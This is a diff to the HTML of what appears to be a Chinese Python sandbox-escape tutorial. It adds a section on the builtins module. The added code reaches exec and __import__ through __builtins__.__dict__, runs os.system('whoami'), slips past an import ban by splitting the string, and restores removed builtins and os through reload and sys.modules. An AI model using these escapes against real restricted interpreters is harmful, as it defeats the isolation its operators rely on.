@@ -2464,6 +2464,15 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#builtins" class="md-nav__link">
+    <span class="md-ellipsis">
+      builtins 内建模块
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2610,6 +2619,15 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#builtins" class="md-nav__link">
+    <span class="md-ellipsis">
+      builtins 内建模块
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2717,6 +2735,40 @@
 <span class="n">aiuser</span>
 </code></pre></div>
 这里 exec 不需要导入就可以直接引用，当然不需要导入就可以引用的函数不止这一个，因为一个内建函数的原因。</p>
+<p>markdown 中 _ 下划线结尾会导致下划线后面的内容变成斜体，所以这里使用加号拼接字符串</p>
+<h3 id="builtins"><code>builtins</code> 内建模块<a class="headerlink" href="#builtins" title="Permanent link">&para;</a></h3>
+<p><code>__builtins__</code>即时引用，在程序还为执行代码的时候就已经加载进来了。此模块并不需要导入，可以在任何模块中执行引用。
+比如在python2中
+<img alt="01_03-01" src="../../../../image/%E7%BC%96%E7%A0%81/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/01_03-01.png" /></p>
+<p>python3中
+<img alt="01_03-02" src="../../../../image/%E7%BC%96%E7%A0%81/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/01_03-02.png" /></p>
+<p>所以我们通过dict属性来调用这些函数，例如如下调用exec来执行其中的python语句。
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;exec&#39;</span><span class="p">](</span><span class="s2">&quot;print(&#39;ok&#39;)&quot;</span><span class="p">)</span>
+<span class="n">ok</span>
+</code></pre></div>
+通过内建函数来导入包
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+<span class="n">aiuser</span>
+</code></pre></div></p>
+<p>万一跟上面一样，禁用了import，当然还可以使用拼接的方式
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;__imp&#39;</span><span class="o">+</span><span class="s1">&#39;ort__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+<span class="n">aiuser</span>
+</code></pre></div>
+如果在<code>__builtins__</code>中，部分需要引用的函数被删除。不能直接用dict属性来调用，可以使用reload来重新加载
+<div class="highlight"><pre><span></span><code><span class="n">reload</span><span class="p">(</span><span class="n">__builtin__</span><span class="p">)</span>
+</code></pre></div>
+如果仔细看上面的图片就可以看到，在python2中reload也是__builtin__的内建函数。如果此函数被删除在python2中也不可以直接引用了。python3中reload不再是内建函数，3.4之前是imp模块下的函数，而之后是importlib模块下的函数。</p>
+<p>所以可以直接利用imp模块来导入，python2也可以利用。
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">imp</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">imp</span><span class="o">.</span><span class="n">reload</span><span class="p">(</span><span class="n">__builtins__</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;__builtin__&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span>
+</code></pre></div>
+在所上的导入模块中，系统的包都在一个默认路径下，被sys的modules存储记录。如果把其中的os模块删除就不能再去加载os模块了，这时候需要手动把os重新加载进去。一般尝试默认路径，或者sys查看存储路径
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">sys</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;/usr/lib/python3.6/os.py&#39;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">os</span>
+<span class="o">&gt;&gt;&gt;</span>
+</code></pre></div></p>
 
 
 
